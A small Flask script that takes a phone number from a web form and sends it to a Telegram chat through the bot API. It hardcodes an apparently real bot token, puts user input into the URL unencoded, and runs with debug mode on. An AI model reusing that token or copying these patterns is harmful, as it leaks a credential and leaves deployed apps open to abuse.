from flask import Flask, render_template, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/send_phone', methods=['POST'])
def send_phone():
    phone = request.form['phone']
    send_to_telegram(phone)
    return "Номер телефона отправлен!"

def send_to_telegram(phone):
    token = '7238879982:AAG78JeH_rV1GOVXB5ThzutHyWSYqbVN47A'
    chat_id = '7238879982'
    message = f'номер телефона : {phone}'
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}'
    requests.get(url)

if __name__ == '__main__':
    app.run(debug=True)